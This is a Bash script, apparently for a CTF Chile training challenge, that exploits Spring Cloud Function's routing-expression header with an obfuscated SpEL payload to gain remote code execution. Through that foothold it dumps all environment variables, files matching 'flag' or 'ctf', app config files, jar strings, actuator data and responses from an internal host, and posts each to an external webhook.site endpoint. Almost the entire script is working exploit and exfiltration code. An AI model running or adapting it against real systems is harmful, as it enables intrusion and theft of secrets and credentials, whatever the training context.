#!/bin/bash
# CTF Chile - Script rápido de búsqueda de flags
# Uso: bash quick_flag_hunt.sh

set -e

TARGET="http://training-pod2.ctfchile.com:32778"

echo "🎯 CTF CHILE - BÚSQUEDA RÁPIDA DE FLAGS"
echo "============================================"

# Crear webhook
echo "[1/4] Creando webhook..."
UUID=$(curl -s -X POST https://webhook.site/token | python3 -c "import json,sys; print(json.load(sys.stdin)['uuid'])")
WH="https://webhook.site/${UUID}"
echo "    ✓ Webhook: https://webhook.site/#!/${UUID}"

# Función para ejecutar RCE
fire() {
    local TAG="$1"
    local CMD="$2"
    local PAYLOAD='T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("exe"+"c",new String[]{}.getClass()).invoke(T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("getRunt"+"ime").invoke(null),new String[]{"/bin/sh","-c","'"${CMD}"'"}).waitFor()'

    curl -s -o /dev/null --max-time 12 \
        -X POST "${TARGET}/functionRouter" \
        -H "spring.cloud.function.routing-expression: ${PAYLOAD}" \
        -H "Content-Type: text/plain" \
        -d 'x'
    echo "    ✓ ${TAG}"
}

echo ""
echo "[2/4] Verificando RCE..."
fire "test" "curl -s ${WH}/alive"
sleep 2

echo ""
echo "[3/4] Buscando flags..."

# Búsquedas principales
fire "env_vars" "env | grep -iE '(flag|ctf|secret)' | curl -s -X POST --data-binary @- ${WH}/env_vars"
fire "flag_files" "find / -name '*flag*' 2>/dev/null | xargs cat 2>/dev/null | curl -s -X POST --data-binary @- ${WH}/flag_files"
fire "ctf_files" "find / -name '*ctf*' 2>/dev/null | xargs cat 2>/dev/null | curl -s -X POST --data-binary @- ${WH}/ctf_files"
fire "app_config" "cat /app/*.properties /app/*.yml 2>/dev/null | curl -s -X POST --data-binary @- ${WH}/app_config"
fire "jar_strings" "strings /app/app.jar | grep -iE '(ctf|flag)' | curl -s -X POST --data-binary @- ${WH}/jar_strings"
fire "actuator" "curl -s http://localhost:8080/actuator/env | curl -s -X POST --data-binary @- ${WH}/actuator"
fire "vault_status" "curl -s http://10.160.209.2:8080/api/status | curl -s -X POST --data-binary @- ${WH}/vault_status"
fire "vault_info" "curl -s http://10.160.209.2:8080/api/info | curl -s -X POST --data-binary @- ${WH}/vault_info"
fire "all_env" "env | curl -s -X POST --data-binary @- ${WH}/all_env"

echo ""
echo "[4/4] Esperando resultados..."
sleep 10

echo ""
echo "============================================"
echo "🔗 REVISA LOS RESULTADOS EN EL WEBHOOK:"
echo "   https://webhook.site/#!/${UUID}"
echo ""
echo "🔍 BUSCA ESTOS PATRONES:"
echo "   • CTF{...}"
echo "   • FLAG{...}"
echo "   • CHILE{...}"
echo "   • Variables con 'flag' o 'secret'"
echo "============================================"